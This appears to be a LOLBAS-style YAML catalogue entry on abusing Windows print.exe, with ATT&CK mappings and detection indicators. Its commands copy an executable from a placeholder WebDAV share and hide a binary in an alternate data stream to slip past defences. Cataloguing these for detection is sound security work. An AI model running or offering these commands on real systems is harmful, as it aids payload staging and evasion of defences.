---
name: Print.exe
description: Used by Windows to send files to the printer
functions:
  copy:
    - description: Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe
      code: print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copy files
    - description: Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
      code: print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copy/Download file from remote server
  ads:
    - description: Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
      code: print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Hide binary file in alternate data stream to potentially bypass defensive counter measures
resources:
    - resource: https://twitter.com/Oddvarmoe/status/985518877076541440
    - resource: https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410
fullpath:
    - path: C:\Windows\System32\print.exe
    - path: C:\Windows\SysWOW64\print.exe
detection:
  - IOC: Print.exe getting files from internet
  - IOC: Print.exe creating executable files on disk
acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
